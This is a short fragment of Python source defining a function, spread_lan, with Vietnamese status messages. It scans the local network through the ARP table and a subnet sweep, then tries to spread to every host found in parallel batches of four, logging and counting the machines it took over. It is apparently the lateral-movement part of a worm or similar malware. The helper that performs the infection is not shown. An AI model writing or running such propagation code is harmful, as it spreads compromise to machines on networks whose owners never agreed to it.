          def spread_lan(subnet=""):
              ip = _local_ip()
              if not ip: return "Khong lay duoc IP LAN"
              prefix = (subnet or "").strip() or ip.rsplit(".", 1)[0]
              cands = set(h for h in _arp_hosts() if h.startswith(prefix + "."))
              try: cands |= set(_sweep(prefix))
              except Exception: pass
              cands.discard(ip)
              hosts = sorted(cands, key=lambda x: int(x.split(".")[-1]))
              if not hosts: return "Khong thay may nao trong LAN"
              got, lock = [], threading.Lock()
              def work(h):
                  try:
                      if _spread_host(h):
                          with lock: got.append(h)
                  except Exception: pass
              i = 0
              while i < len(hosts):
                  ts = [threading.Thread(target=work, args=(h,), daemon=True)
                        for h in hosts[i:i+4]]
                  for t in ts: t.start()
                  for t in ts: t.join()
                  i += 4
              _stat["hosts"] = got; _stat["lan"] = len(got); _stat["last_lan"] = time.time()
              _log(f"LAN: {len(got)}/{len(hosts)}")
              return (f"Quet {len(hosts)} may -> lay duoc {len(got)}"
                      + (": " + ", ".join(got) if got else " (khong)"))

